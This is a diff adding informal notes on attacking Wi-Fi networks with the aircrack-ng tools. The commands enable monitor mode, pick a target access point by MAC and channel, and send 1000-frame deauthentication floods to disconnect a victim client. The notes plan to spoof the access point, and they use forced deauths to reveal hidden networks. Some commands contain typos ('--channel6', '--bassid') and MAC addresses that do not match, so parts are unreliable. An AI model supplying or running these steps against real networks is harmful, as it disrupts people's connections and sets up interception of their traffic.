@@ -1,0 +1,88 @@
+	Notes On Wifi Hacking
+
+Have a wireless adapter that can inject packets and enter in monitor mode.
+
+CMD to enter.
+How to enter Monitor mode.. 1st way
+
+airmon-ng
+airmon-ng start (name of your wifi adapter (wlan1)) 
+iwconfig wlan1mon
+
+use the name that airmon-ng tells you
+
+airmon-ng stop wlan1mon
+
+-------------
+
+2nd way
+
+ifconfig wlan1mon down
+iwconfig wlan1mon mode monitor
+ifconfig wlan1mon up
+iwconfig wlan1mon
+
+------------------------------
+
+3rd way
+
+ifconfig wlan1mon down
+airmon-ng check kill
+airmon-ng start wlan1mon
+
+----------------------------------------
+
+see and scans the networks the wifi adapter is in range
+
+airodump-ng wlan1mon
+
+now we have our network we want to target
+
+
+airodump-ng --channel6 --bassid 4C:12:65:4D:5B:C1 --write test-pizza wlan1mon 
+
+ channel     mac address of target 
+ write tells airodump to log all files
+create a file test-pizza
+name of wifi adapter
+
+
+Deauthentication Attacks
+
+use this to disconnect the target machine.
+we want to disconnect to target machine and than we want to disconnect the target network.
+once we disconnect the target access point we will spoof the access point for the target to connect to us.
+
+aireplay-ng
+aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1
+
+airodump-ng name of our (adapter)
+
+
+Discover hidden networks
+
+# what networks are hidden <length: 0>
+
+airodump-ng --bssid 33:22:02:33:33:33 --channel 6 wlan1
+
+# disconnect the target and when they are connecting the name will show
+in the 2nd terminal running   airodump-ng --bssid 52:12:65:4D:5B:C1 --channel 6 wlan1 
+ 
+aireplay-ng --deauth 1000 -a 33:22:02:33:33:33 -c 44:44:44:88:44:44 wlan1
+
+How to put your computer in managed mode
+ifconfig wlan1 down
+iwconfig wlan1 mode managed 
+ifconfig wlan1 up
+iwconfig wlan1
+
+service network-manager start
+
+
+
+
+
+
+
+
+ 
